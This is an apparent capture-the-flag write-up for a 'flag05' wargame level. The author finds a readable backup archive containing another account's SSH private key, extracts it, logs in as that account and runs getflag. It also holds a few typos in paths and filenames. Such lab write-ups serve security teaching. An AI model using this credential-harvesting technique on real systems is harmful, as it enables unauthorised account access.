Let's take a look at the challenge direcotry...

```
$ cd /home/flag05/
$ ls -asl
total 9
0 drwxr-x--- 1 flag05 level05   80  2016-12-18 18:25  .
0 drwxr-xr-x 1 root   root     140  2012-08-27 07:18  ..
0 drwxr-xr-x 2 flag05 level05   42  2011-11-20 20:13  .backup
4 -rw------- 1 flag05 level05   13  2016-12-18 18:25  .bash_history
1 -rw-r--r-- 1 flag05 level05  220  2011-05-18 02:54  .bash_logout
4 -rw-r--r-- 1 flag05 level05 3353  2011-05-18 02:54  .bashrc
0 drwxx----- 2 flag05 level05   60  2016-12-18 18:24  .cache
1 -rw-r--r-- 1 flag05 level05  675  2011-05-18 02:54  .profile
0 drwxr----- 2 flag05 level05   70  2011-11-20 20:13  .ssh
$ cd .ssh
sh: cd: .ssh: Permission denied
```

So looking at the contents of the folder, we a lot of hidden directories (hidden directories are specified by having a "." infornt of their name). We see that there is a folder that should store ssh keys, however we have no access to it.
We do have read access to the backup folder, let's see what is in there.

```
$ cd .backup/
$ ls
backup-19072011.tgx
$ cp backup-19072011.tgx ~/
$ cd ~
$ ls
backup-19072011.tgz
$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

So in the backup forlder, we found a tar file which we copied to our home directory, then extracted it. Within the tar file were the keys for an ssh connection. Let's try them out with the flag05 account (I don't need to specify the specific keys here, since the keys are stored in the defaul location).

```
$ ssh flag05@localhost
```

There is the typical ssh prompt here, you will want to respond with yes.

```
$ /bib/getflag
You have successfully executed getflag on a target account
```

And just like that, we pwned the challenge.
